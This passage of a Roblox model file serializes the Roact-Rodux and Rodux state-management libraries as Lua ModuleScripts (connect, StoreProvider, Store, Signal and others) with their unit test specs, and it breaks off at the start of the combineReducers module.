				<ProtectedString name="Source"><![CDATA[local StoreProvider = require(script.StoreProvider)
local connect = require(script.connect)
local getStore = require(script.getStore)
local TempConfig = require(script.TempConfig)

return {
	StoreProvider = StoreProvider,
	connect = connect,
	UNSTABLE_getStore = getStore,
	UNSTABLE_connect2 = connect,

	TEMP_CONFIG = TempConfig,
}]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
			<Item class="ModuleScript" referent="RBXB6743D68E8964E03883138499AC3B956">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">join</string>
					<string name="ScriptGuid">{86128C85-C8E1-48C7-8DE5-2778940A7E3F}</string>
					<ProtectedString name="Source"><![CDATA[local function join(...)
	local result = {}

	for i = 1, select("#", ...) do
		local source = select(i, ...)

		if source ~= nil then
			for key, value in pairs(source) do
				result[key] = value
			end
		end
	end

	return result
end

return join]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX75F54EDEAECF4A9E84E8FF454EB09D85">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">shallowEqual.spec</string>
					<string name="ScriptGuid">{D7F28A8D-521C-44F0-A6B7-D5D649E991AE}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local shallowEqual = require(script.Parent.shallowEqual)

	it("should compare dictionaries", function()
		local a = {
			a = "a",
			b = {},
			c = 6,
		}

		local b = {
			b = a.b,
			c = a.c,
			a = a.a,
		}

		local c = {
			b = {},
			a = a.a,
			c = a.c,
		}

		local d = {
			a = a.a,
			b = a.b,
			c = a.c,
			d = "hello",
		}

		expect(shallowEqual(a, a)).to.equal(true)
		expect(shallowEqual(a, b)).to.equal(true)
		expect(shallowEqual(a, c)).to.equal(false)
		expect(shallowEqual(b, c)).to.equal(false)
		expect(shallowEqual(a, d)).to.equal(false)
		expect(shallowEqual(b, d)).to.equal(false)
	end)

	it("should handle nil for either argument", function()
		local a = {}

		expect(shallowEqual(nil, nil)).to.equal(true)
		expect(shallowEqual(a, nil)).to.equal(false)
		expect(shallowEqual(nil, a)).to.equal(false)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX06D8D06F4CD249C0B49264F554A74753">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">storeKey</string>
					<string name="ScriptGuid">{A3695724-3D96-4B31-A0E9-E0C90F473029}</string>
					<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Symbol)

return Symbol.named("RoduxStore")]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXA318ACC6253147D28A88B7892013F79A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">connect.spec</string>
					<string name="ScriptGuid">{332397B4-A15B-4CB4-85A7-58E5C01D9EB0}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local connect = require(script.Parent.connect)

	local StoreProvider = require(script.Parent.StoreProvider)

	local Roact = require(script.Parent.Parent.Roact)
	local Rodux = require(script.Parent.Parent.Rodux)

	local TempConfig = require(script.Parent.TempConfig)

	local function noop()
		return nil
	end

	local function NoopComponent()
		return nil
	end

	local function countReducer(state, action)
		state = state or 0

		if action.type == "increment" then
			return state + 1
		end

		return state
	end

	local reducer = Rodux.combineReducers({
		count = countReducer,
	})

	describe("Argument validation", function()
		it("should accept no arguments", function()
			connect()
		end)

		it("should accept one function", function()
			connect(noop)
		end)

		it("should accept two functions", function()
			connect(noop, noop)
		end)

		it("should accept only the second function", function()
			connect(nil, function() end)
		end)

		it("should throw if not passed a component", function()
			local selector = function(store)
				return {}
			end

			expect(function()
				connect(selector)(nil)
			end).to.throw()
		end)
	end)

	it("should throw if not mounted under a StoreProvider", function()
		local ConnectedSomeComponent = connect()(NoopComponent)

		expect(function()
			Roact.mount(Roact.createElement(ConnectedSomeComponent))
		end).to.throw()
	end)

	it("should accept a higher-order function mapStateToProps", function()
		local function mapStateToProps()
			return function(state)
				return {
					count = state.count,
				}
			end
		end

		local ConnectedSomeComponent = connect(mapStateToProps)(NoopComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent),
		})

		local handle = Roact.mount(tree)

		Roact.unmount(handle)
	end)

	it("should not accept a higher-order mapStateToProps that returns a non-table value", function()
		local function mapStateToProps()
			return function(state)
				return "nope"
			end
		end

		local ConnectedSomeComponent = connect(mapStateToProps)(NoopComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent),
		})

		expect(function()
			Roact.mount(tree)
		end).to.throw()
	end)

	it("should not accept a mapStateToProps that returns a non-table value", function()
		local function mapStateToProps()
			return "nah"
		end

		local ConnectedSomeComponent = connect(mapStateToProps)(NoopComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent),
		})

		expect(function()
			Roact.mount(tree)
		end).to.throw()
	end)

	it("should abort renders when mapStateToProps returns the same data", function()
		local function mapStateToProps(state)
			return {
				count = state.count,
			}
		end

		local renderCount = 0
		local function SomeComponent(props)
			renderCount = renderCount + 1
		end

		local ConnectedSomeComponent = connect(mapStateToProps)(SomeComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent),
		})

		local handle = Roact.mount(tree)

		expect(renderCount).to.equal(1)

		store:dispatch({ type = "an unknown action" })
		store:flush()

		expect(renderCount).to.equal(1)

		store:dispatch({ type = "increment" })
		store:flush()

		expect(renderCount).to.equal(2)

		Roact.unmount(handle)
	end)

	it("should only call mapDispatchToProps once and never re-render if no mapStateToProps was passed", function()
		local dispatchCount = 0
		local mapDispatchToProps = function(dispatch)
			dispatchCount = dispatchCount + 1

			return {
				increment = function()
					return dispatch({ type = "increment" })
				end,
			}
		end

		local renderCount = 0
		local function SomeComponent(props)
			renderCount = renderCount + 1
		end

		local ConnectedSomeComponent = connect(nil, mapDispatchToProps)(SomeComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent),
		})

		local handle = Roact.mount(tree)

		expect(dispatchCount).to.equal(1)
		expect(renderCount).to.equal(1)

		store:dispatch({ type = "an unknown action" })
		store:flush()

		expect(dispatchCount).to.equal(1)
		expect(renderCount).to.equal(1)

		store:dispatch({ type = "increment" })
		store:flush()

		expect(dispatchCount).to.equal(1)
		expect(renderCount).to.equal(1)

		Roact.unmount(handle)
	end)

	it("should return result values from the dispatch passed to mapDispatchToProps", function()
		local function reducer()
			return 0
		end

		local function fiveThunk()
			return 5
		end

		local dispatch
		local function SomeComponent(props)
			dispatch = props.dispatch
		end

		local function mapDispatchToProps(dispatch)
			return {
				dispatch = dispatch
			}
		end

		local ConnectedSomeComponent = connect(nil, mapDispatchToProps)(SomeComponent)

		-- We'll use the thunk middleware, as it should always return its result
		local store = Rodux.Store.new(reducer, nil, { Rodux.thunkMiddleware })
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			someComponent = Roact.createElement(ConnectedSomeComponent)
		})

		local handle = Roact.mount(tree)

		expect(dispatch).to.be.a("function")
		expect(dispatch(fiveThunk)).to.equal(5)

		Roact.unmount(handle)
	end)

	it("should render parent elements before children", function()
		local oldNewConnectionOrder = TempConfig.newConnectionOrder
		TempConfig.newConnectionOrder = true

		local function mapStateToProps(state)
			return {
				count = state.count,
			}
		end

		local childWasRenderedFirst = false

		local function ChildComponent(props)
			if props.count > props.parentCount then
				childWasRenderedFirst = true
			end
		end

		local ConnectedChildComponent = connect(mapStateToProps)(ChildComponent)

		local function ParentComponent(props)
			return Roact.createElement(ConnectedChildComponent, {
				parentCount = props.count,
			})
		end

		local ConnectedParentComponent = connect(mapStateToProps)(ParentComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			parent = Roact.createElement(ConnectedParentComponent),
		})

		local handle = Roact.mount(tree)

		store:dispatch({ type = "increment" })
		store:flush()

		store:dispatch({ type = "increment" })
		store:flush()

		Roact.unmount(handle)

		expect(childWasRenderedFirst).to.equal(false)

		TempConfig.newConnectionOrder = oldNewConnectionOrder
	end)

	it("should render child elements before children when TempConfig.newConnectionOrder is false", function()
		local oldNewConnectionOrder = TempConfig.newConnectionOrder
		TempConfig.newConnectionOrder = false

		local function mapStateToProps(state)
			return {
				count = state.count,
			}
		end

		local childWasRenderedFirst = false

		local function ChildComponent(props)
			if props.count > props.parentCount then
				childWasRenderedFirst = true
			end
		end

		local ConnectedChildComponent = connect(mapStateToProps)(ChildComponent)

		local function ParentComponent(props)
			return Roact.createElement(ConnectedChildComponent, {
				parentCount = props.count,
			})
		end

		local ConnectedParentComponent = connect(mapStateToProps)(ParentComponent)

		local store = Rodux.Store.new(reducer)
		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			parent = Roact.createElement(ConnectedParentComponent),
		})

		local handle = Roact.mount(tree)

		store:dispatch({ type = "increment" })
		store:flush()

		store:dispatch({ type = "increment" })
		store:flush()

		Roact.unmount(handle)

		expect(childWasRenderedFirst).to.equal(true)

		TempConfig.newConnectionOrder = oldNewConnectionOrder
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXFF1A565118BA4A129D95521ECB0D994E">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">getStore.spec</string>
					<string name="ScriptGuid">{597DF7E6-CCF3-4E33-908E-CB6A30376A61}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Roact = require(script.Parent.Parent.Roact)
	local Rodux = require(script.Parent.Parent.Rodux)

	local StoreProvider = require(script.Parent.StoreProvider)

	local getStore = require(script.Parent.getStore)

	it("should return the store when present", function()
		local function reducer()
			return 0
		end

		local store = Rodux.Store.new(reducer)
		local consumedStore = nil

		local StoreConsumer = Roact.Component:extend("StoreConsumer")

		function StoreConsumer:init()
			consumedStore = getStore(self)
		end

		function StoreConsumer:render()
			return nil
		end

		local tree = Roact.createElement(StoreProvider, {
			store = store,
		}, {
			Consumer = Roact.createElement(StoreConsumer),
		})

		local handle = Roact.mount(tree)

		expect(consumedStore).to.equal(store)

		Roact.unmount(handle)
		store:destruct()
	end)

	it("should return nil when the store is not present", function()
		-- Use a non-nil value to know for sure if StoreConsumer:init was called
		local consumedStore = 6

		local StoreConsumer = Roact.Component:extend("StoreConsumer")

		function StoreConsumer:init()
			consumedStore = getStore(self)
		end

		function StoreConsumer:render()
			return nil
		end

		local tree = Roact.createElement(StoreConsumer)
		local handle = Roact.mount(tree)

		expect(consumedStore).to.equal(nil)

		Roact.unmount(handle)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB05FB859550D42B098FFCFDDB8D9D7D8">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">connect</string>
					<string name="ScriptGuid">{1E2D76E1-3BBE-46FC-9CF1-434C01165E04}</string>
					<ProtectedString name="Source"><![CDATA[local Roact = require(script.Parent.Parent.Roact)
local getStore = require(script.Parent.getStore)
local shallowEqual = require(script.Parent.shallowEqual)
local join = require(script.Parent.join)

local TempConfig = require(script.Parent.TempConfig)

--[[
	Formats a multi-line message with printf-style placeholders.
]]
local function formatMessage(lines, parameters)
	return table.concat(lines, "\n"):format(unpack(parameters or {}))
end

local function noop()
	return nil
end

--[[
	The stateUpdater accepts props when they update and computes the
	complete set of props that should be passed to the wrapped component.

	Each connected component will have a stateUpdater created for it.

	stateUpdater is put into the component's state in order for
	getDerivedStateFromProps to be able to access it. It is not mutated.
]]
local function makeStateUpdater(store)
	return function(nextProps, prevState, mappedStoreState)
		-- The caller can optionally provide mappedStoreState if it needed that
		-- value beforehand. Doing so is purely an optimization.
		if mappedStoreState == nil then
			mappedStoreState = prevState.mapStateToProps(store:getState(), nextProps)
		end

		local propsForChild = join(nextProps, mappedStoreState, prevState.mappedStoreDispatch)

		return {
			mappedStoreState = mappedStoreState,
			propsForChild = propsForChild,
		}
	end
end

--[[
	mapStateToProps:
		(storeState, props) -> partialProps
		OR
		() -> (storeState, props) -> partialProps
	mapDispatchToProps: (dispatch) -> partialProps
]]
local function connect(mapStateToPropsOrThunk, mapDispatchToProps)
	local connectTrace = debug.traceback()

	if mapStateToPropsOrThunk ~= nil then
		assert(typeof(mapStateToPropsOrThunk) == "function", "mapStateToProps must be a function or nil!")
	else
		mapStateToPropsOrThunk = noop
	end

	if mapDispatchToProps ~= nil then
		assert(typeof(mapDispatchToProps) == "function", "mapDispatchToProps must be a function or nil!")
	else
		mapDispatchToProps = noop
	end

	return function(innerComponent)
		if innerComponent == nil then
			local message = formatMessage({
				"connect returns a function that must be passed a component.",
				"Check the connection at:",
				"%s",
			}, {
				connectTrace,
			})

			error(message, 2)
		end

		local componentName = ("RoduxConnection(%s)"):format(tostring(innerComponent))

		local Connection = Roact.Component:extend(componentName)

		function Connection.getDerivedStateFromProps(nextProps, prevState)
			if prevState.stateUpdater ~= nil then
				return prevState.stateUpdater(nextProps, prevState)
			end
		end

		function Connection:createStoreConnection()
			self.storeChangedConnection = self.store.changed:connect(function(storeState)
				self:setState(function(prevState, props)
					local mappedStoreState = prevState.mapStateToProps(storeState, props)

					-- We run this check here so that we only check shallow
					-- equality with the result of mapStateToProps, and not the
					-- other props that could be passed through the connector.
					if shallowEqual(mappedStoreState, prevState.mappedStoreState) then
						return nil
					end

					return prevState.stateUpdater(props, prevState, mappedStoreState)
				end)
			end)
		end

		function Connection:init()
			self.store = getStore(self)

			if self.store == nil then
				local message = formatMessage({
					"Cannot initialize Roact-Rodux connection without being a descendent of StoreProvider!",
					"Tried to wrap component %q",
					"Make sure there is a StoreProvider above this component in the tree.",
				}, {
					tostring(innerComponent),
				})

				error(message)
			end

			local storeState = self.store:getState()

			local mapStateToProps = mapStateToPropsOrThunk
			local mappedStoreState = mapStateToProps(storeState, self.props)

			-- mapStateToPropsOrThunk can return a function instead of a state
			-- value. In this variant, we keep that value as mapStateToProps
			-- instead of the original mapStateToProps. This matches react-redux
			-- and enables connectors to keep instance-level state.
			if typeof(mappedStoreState) == "function" then
				mapStateToProps = mappedStoreState
				mappedStoreState = mapStateToProps(storeState, self.props)
			end

			if mappedStoreState ~= nil and typeof(mappedStoreState) ~= "table" then
				local message = formatMessage({
					"mapStateToProps must either return a table, or return another function that returns a table.",
					"Instead, it returned %q, which is of type %s.",
				}, {
					tostring(mappedStoreState),
					typeof(mappedStoreState),
				})

				error(message)
			end

			local mappedStoreDispatch = mapDispatchToProps(function(...)
				return self.store:dispatch(...)
			end)

			local stateUpdater = makeStateUpdater(self.store)

			self.state = {
				-- Combines props, mappedStoreDispatch, and the result of
				-- mapStateToProps into propsForChild. Stored in state so that
				-- getDerivedStateFromProps can access it.
				stateUpdater = stateUpdater,

				-- Used by the store changed connection and stateUpdater to
				-- construct propsForChild.
				mapStateToProps = mapStateToProps,

				-- Used by stateUpdater to construct propsForChild.
				mappedStoreDispatch = mappedStoreDispatch,

				-- Passed directly into the component that Connection is
				-- wrapping.
				propsForChild = nil,
			}

			local extraState = stateUpdater(self.props, self.state, mappedStoreState)

			for key, value in pairs(extraState) do
				self.state[key] = value
			end

			if TempConfig.newConnectionOrder then
				self:createStoreConnection()
			end
		end

		function Connection:didMount()
			if not TempConfig.newConnectionOrder then
				self:createStoreConnection()
			end
		end

		function Connection:willUnmount()
			self.storeChangedConnection:disconnect()
		end

		function Connection:render()
			return Roact.createElement(innerComponent, self.state.propsForChild)
		end

		return Connection
	end
end

return connect]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX4BF8903F96754FBB97CA4128C767CE98">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">TempConfig</string>
					<string name="ScriptGuid">{28CF58AE-314B-4070-91B1-395C72F86958}</string>
					<ProtectedString name="Source"><![CDATA[return {
	newConnectionOrder = true,
}
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX547619ECFE4845CB988A6CF33CBFA6D9">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Symbol</string>
					<string name="ScriptGuid">{F59214A1-1142-40F5-A9B7-DB9D42E78846}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A 'Symbol' is an opaque marker type that can be used to signify unique
	statuses. Symbols have the type 'userdata', but when printed to the console,
	the name of the symbol is shown.
]]

local Symbol = {}

--[[
	Creates a Symbol with the given name.

	When printed or coerced to a string, the symbol will turn into the string
	given as its name.
]]
function Symbol.named(name)
	assert(type(name) == "string", "Symbols must be created using a string name!")

	local self = newproxy(true)

	local wrappedName = ("Symbol(%s)"):format(name)

	getmetatable(self).__tostring = function()
		return wrappedName
	end

	return self
end

--[[
	Create an unnamed Symbol. Usually, you should create a named Symbol using
	Symbol.named(name)
]]
function Symbol.unnamed()
	local self = newproxy(true)

	getmetatable(self).__tostring = function()
		return "Unnamed Symbol"
	end

	return self
end

return Symbol]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX8D37C82CA1FE471ABFAA1514B997174D">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">getStore</string>
					<string name="ScriptGuid">{92FE3B35-1B1D-4507-AB49-D7637275B03A}</string>
					<ProtectedString name="Source"><![CDATA[local storeKey = require(script.Parent.storeKey)

local function getStore(componentInstance)
	return componentInstance._context[storeKey]
end

return getStore]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX75419BEB89E34B8AB704426FE2C1882A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Symbol.spec</string>
					<string name="ScriptGuid">{D42DCACC-7638-422D-86A3-9944F1BBC26E}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Symbol = require(script.Parent.Symbol)

	describe("named", function()
		it("should give an opaque object", function()
			local symbol = Symbol.named("foo")

			expect(symbol).to.be.a("userdata")
		end)

		it("should coerce to the given name", function()
			local symbol = Symbol.named("foo")

			expect(tostring(symbol):find("foo")).to.be.ok()
		end)

		it("should be unique when constructed", function()
			local symbolA = Symbol.named("abc")
			local symbolB = Symbol.named("abc")

			expect(symbolA).never.to.equal(symbolB)
		end)
	end)

	describe("unnamed", function()
		it("should give an opaque object", function()
			local symbol = Symbol.unnamed()

			expect(symbol).to.be.a("userdata")
		end)

		it("should coerce to some string", function()
			local symbol = Symbol.unnamed()

			expect(tostring(symbol)).to.be.a("string")
		end)

		it("should be unique when constructed", function()
			local symbolA = Symbol.unnamed()
			local symbolB = Symbol.unnamed()

			expect(symbolA).never.to.equal(symbolB)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX9BA123782BD141639596BAA492C1E1CA">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">StoreProvider.spec</string>
					<string name="ScriptGuid">{FAC225C2-B82A-4195-8ADE-FC7998D4BF97}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local StoreProvider = require(script.Parent.StoreProvider)

	local Roact = require(script.Parent.Parent.Roact)
	local Rodux = require(script.Parent.Parent.Rodux)

	it("should be instantiable as a component", function()
		local store = Rodux.Store.new(function()
			return 0
		end)
		local element = Roact.createElement(StoreProvider, {
			store = store
		})

		expect(element).to.be.ok()

		local handle = Roact.mount(element, nil, "StoreProvider-test")

		Roact.unmount(handle)
		store:destruct()
	end)

	it("should expect a 'store' prop", function()
		local element = Roact.createElement(StoreProvider)

		expect(function()
			Roact.mount(element)
		end).to.throw()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX95E6AABE2F36431EA351CE0579D9F6C8">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">shallowEqual</string>
					<string name="ScriptGuid">{ECE18F0B-267B-4AC2-B4AE-7484D36C694C}</string>
					<ProtectedString name="Source"><![CDATA[local function shallowEqual(a, b)
	if a == nil then
		return b == nil
	elseif b == nil then
		return a == nil
	end

	for key, value in pairs(a) do
		if value ~= b[key] then
			return false
		end
	end

	for key, value in pairs(b) do
		if value ~= a[key] then
			return false
		end
	end

	return true
end

return shallowEqual]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX75FC49E666204358BC90EFDF6CFF9937">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">StoreProvider</string>
					<string name="ScriptGuid">{C0718CBA-9C81-41DD-838C-F6E265395FC9}</string>
					<ProtectedString name="Source"><![CDATA[local Roact = require(script.Parent.Parent.Roact)

local storeKey = require(script.Parent.storeKey)

local StoreProvider = Roact.Component:extend("StoreProvider")

function StoreProvider:init(props)
	local store = props.store

	if store == nil then
		error("Error initializing StoreProvider. Expected a `store` prop to be a Rodux store.")
	end

	self._context[storeKey] = store
end

function StoreProvider:render()
	return Roact.oneChild(self.props[Roact.Children])
end

return StoreProvider]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
		</Item>
		<Item class="ModuleScript" referent="RBX2882D822B74C41DD89C55DFCDE3D82FA">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">Rodux</string>
				<string name="ScriptGuid">{C0B1C49E-ED83-4636-B8A8-4A3326C7C771}</string>
				<ProtectedString name="Source"><![CDATA[local Store = require(script.Store)
local createReducer = require(script.createReducer)
local combineReducers = require(script.combineReducers)
local loggerMiddleware = require(script.loggerMiddleware)
local thunkMiddleware = require(script.thunkMiddleware)

return {
	Store = Store,
	createReducer = createReducer,
	combineReducers = combineReducers,
	loggerMiddleware = loggerMiddleware.middleware,
	thunkMiddleware = thunkMiddleware,
}
]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
			<Item class="ModuleScript" referent="RBXF2229312096043B2B7E1ADC64C6C01C4">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">NoYield</string>
					<string name="ScriptGuid">{C46A1E0E-7922-44AB-BFA5-6911610B00E9}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Calls a function and throws an error if it attempts to yield.

	Pass any number of arguments to the function after the callback.

	This function supports multiple return; all results returned from the
	given function will be returned.
]]

local function resultHandler(co, ok, ...)
	if not ok then
		local message = (...)
		error(debug.traceback(co, message), 2)
	end

	if coroutine.status(co) ~= "dead" then
		error(debug.traceback(co, "Attempted to yield inside changed event!"), 2)
	end

	return ...
end

local function NoYield(callback, ...)
	local co = coroutine.create(callback)

	return resultHandler(co, coroutine.resume(co, ...))
end

return NoYield]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX7CC93943CA754F49B8416AD17FEB85A9">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Signal</string>
					<string name="ScriptGuid">{4566A4EC-8523-4975-8F82-C2465A0ED379}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A limited, simple implementation of a Signal.

	Handlers are fired in order, and (dis)connections are properly handled when
	executing an event.
]]

local function immutableAppend(list, ...)
	local new = {}
	local len = #list

	for key = 1, len do
		new[key] = list[key]
	end

	for i = 1, select("#", ...) do
		new[len + i] = select(i, ...)
	end

	return new
end

local function immutableRemoveValue(list, removeValue)
	local new = {}

	for i = 1, #list do
		if list[i] ~= removeValue then
			table.insert(new, list[i])
		end
	end

	return new
end

local Signal = {}

Signal.__index = Signal

function Signal.new()
	local self = {
		_listeners = {}
	}

	setmetatable(self, Signal)

	return self
end

function Signal:connect(callback)
	local listener = {
		callback = callback,
		disconnected = false,
	}

	self._listeners = immutableAppend(self._listeners, listener)

	local function disconnect()
		listener.disconnected = true
		self._listeners = immutableRemoveValue(self._listeners, listener)
	end

	return {
		disconnect = disconnect
	}
end

function Signal:fire(...)
	for _, listener in ipairs(self._listeners) do
		if not listener.disconnected then
			listener.callback(...)
		end
	end
end

return Signal]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX5EC1382F8B4A49EFBC38D43C54A636A8">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Store</string>
					<string name="ScriptGuid">{DFA54F1F-FEA6-4119-8883-43C5AC3E37CE}</string>
					<ProtectedString name="Source"><![CDATA[local RunService = game:GetService("RunService")

local Signal = require(script.Parent.Signal)
local NoYield = require(script.Parent.NoYield)

local Store = {}

-- This value is exposed as a private value so that the test code can stay in
-- sync with what event we listen to for dispatching the Changed event.
-- It may not be Heartbeat in the future.
Store._flushEvent = RunService.Heartbeat

Store.__index = Store

--[[
	Create a new Store whose state is transformed by the given reducer function.

	Each time an action is dispatched to the store, the new state of the store
	is given by:

		state = reducer(state, action)

	Reducers do not mutate the state object, so the original state is still
	valid.
]]
function Store.new(reducer, initialState, middlewares)
	assert(typeof(reducer) == "function", "Bad argument #1 to Store.new, expected function.")
	assert(middlewares == nil or typeof(middlewares) == "table", "Bad argument #3 to Store.new, expected nil or table.")

	local self = {}

	self._reducer = reducer
	self._state = reducer(initialState, {
		type = "@@INIT",
	})
	self._lastState = self._state

	self._mutatedSinceFlush = false
	self._connections = {}

	self.changed = Signal.new()

	setmetatable(self, Store)

	local connection = self._flushEvent:Connect(function()
		self:flush()
	end)
	table.insert(self._connections, connection)

	if middlewares then
		local unboundDispatch = self.dispatch
		local dispatch = function(...)
			return unboundDispatch(self, ...)
		end

		for i = #middlewares, 1, -1 do
			local middleware = middlewares[i]
			dispatch = middleware(dispatch, self)
		end

		self.dispatch = function(self, ...)
			return dispatch(...)
		end
	end

	return self
end

--[[
	Get the current state of the Store. Do not mutate this!
]]
function Store:getState()
	return self._state
end

--[[
	Dispatch an action to the store. This allows the store's reducer to mutate
	the state of the application by creating a new copy of the state.

	Listeners on the changed event of the store are notified when the state
	changes, but not necessarily on every Dispatch.
]]
function Store:dispatch(action)
	if typeof(action) == "table" then
		if action.type == nil then
			error("action does not have a type field", 2)
		end

		self._state = self._reducer(self._state, action)
		self._mutatedSinceFlush = true
	else
		error(("actions of type %q are not permitted"):format(typeof(action)), 2)
	end
end

--[[
	Marks the store as deleted, disconnecting any outstanding connections.
]]
function Store:destruct()
	for _, connection in ipairs(self._connections) do
		connection:Disconnect()
	end

	self._connections = nil
end

--[[
	Flush all pending actions since the last change event was dispatched.
]]
function Store:flush()
	if not self._mutatedSinceFlush then
		return
	end

	self._mutatedSinceFlush = false

	-- On self.changed:fire(), further actions may be immediately dispatched, in
	-- which case self._lastState will be set to the most recent self._state,
	-- unless we cache this value first
	local state = self._state

	-- If a changed listener yields, *very* surprising bugs can ensue.
	-- Because of that, changed listeners cannot yield.
	NoYield(function()
		self.changed:fire(state, self._lastState)
	end)

	self._lastState = state
end

return Store
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2641D641DF064833852A3C1FEB74C11A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">combineReducers</string>
					<string name="ScriptGuid">{68E382BB-11B0-42D9-8629-837E8065C795}</string>
					<ProtectedString name="Source"><![CDATA[--[[
